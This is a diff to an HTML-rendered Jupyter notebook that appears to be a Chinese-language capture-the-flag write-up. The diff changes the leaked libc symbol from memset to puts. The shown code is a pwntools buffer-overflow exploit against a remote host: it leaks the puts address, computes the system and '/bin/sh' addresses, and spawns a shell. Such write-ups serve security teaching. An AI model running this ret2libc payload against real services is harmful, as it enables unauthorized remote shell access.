@@ -13438,7 +13438,7 @@ Plz input something:
 <div class="cell border-box-sizing text_cell rendered"><div class="prompt input_prompt">
 </div><div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<p>可以看到泄露的 <code>memset</code> 地址与 libc 中是对应的。<br>
+<p>可以看到泄露的 <code>puts</code> 地址与 libc 中是对应的。<br>
 接下来就在可以远程运行 shell 命令。考虑到 ASLR 的影响，libc 的地址每次加载可能都会变化，所以地址泄露和函数调用需要在同一个进程中完成。<br>
 由于 Jupyter Notebook 不能进行交互，我们使用函数每次运行一条命令：</p>
 
@@ -13453,16 +13453,16 @@ Plz input something:
 <div class=" highlight hl-ipython2"><pre><span></span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;202.112.51.154&#39;</span><span class="p">,</span> <span class="mi">20001</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
 
-<span class="c1"># leak memset address</span>
+<span class="c1"># leak puts address</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">51</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">71</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_address_ptr</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
 <span class="n">leaked_info</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">memset_address</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">leaked_info</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">]))</span>
+<span class="n">puts_address</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">leaked_info</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">]))</span>
 
 <span class="c1"># calculate function address</span>
-<span class="n">system_address</span> <span class="o">=</span> <span class="n">memset_address</span> <span class="o">+</span> <span class="n">system_offset</span>
-<span class="n">sh_str_address</span> <span class="o">=</span> <span class="n">memset_address</span> <span class="o">+</span> <span class="n">sh_str_offset</span>
+<span class="n">system_address</span> <span class="o">=</span> <span class="n">puts_address</span> <span class="o">+</span> <span class="n">system_offset</span>
+<span class="n">sh_str_address</span> <span class="o">=</span> <span class="n">puts_address</span> <span class="o">+</span> <span class="n">sh_str_offset</span>
 
 <span class="c1"># getshell!</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">51</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">71</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sh_str_address</span><span class="p">)</span>
